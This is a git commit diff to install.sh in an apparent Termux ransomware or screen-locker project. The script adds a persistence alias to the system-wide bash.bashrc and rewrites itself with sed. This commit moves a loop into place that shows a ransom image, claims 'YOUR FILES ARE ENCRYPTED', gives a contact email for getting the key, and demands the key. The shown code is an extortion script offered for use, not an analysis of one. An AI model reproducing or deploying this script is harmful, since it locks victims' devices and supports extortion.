b52399abcfa2cd85c47bcff5f780a29e824250a8
noname1818271718172672 <127699732+ixzzxitado@users.noreply.github.com>
2024-02-29 15:50:41 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -9,14 +9,15 @@ chmod u=rwx 1705743575411.png
 clear
 echo -e "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
 sed -i '9s/echo/#/' install.sh || sed -i '10s/echo/#/' install.sh
-termimage 1705743575411.png
-echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
-echo ""
-echo -e "\033[0;49;95m Talk with the\033[m\033[0;49;93m userpropez8183718@proton.me\033[0;49;95m To get the Encrypt Key!\033[m"
-echo ""
 sleep 1
 while :
 do
+	
+	termimage 1705743575411.png
+ 	echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
+  	echo ""
+   	echo -e "\033[0;49;95m Talk with the\033[m\033[0;49;93m userpropez8183718@proton.me\033[0;49;95m To get the Encrypt Key!\033[m"
+    	echo ""
 	echo -e "\033[4;49;92m"
 	read -p "Encrypted Key: " key      
 	echo -e "\033[m"
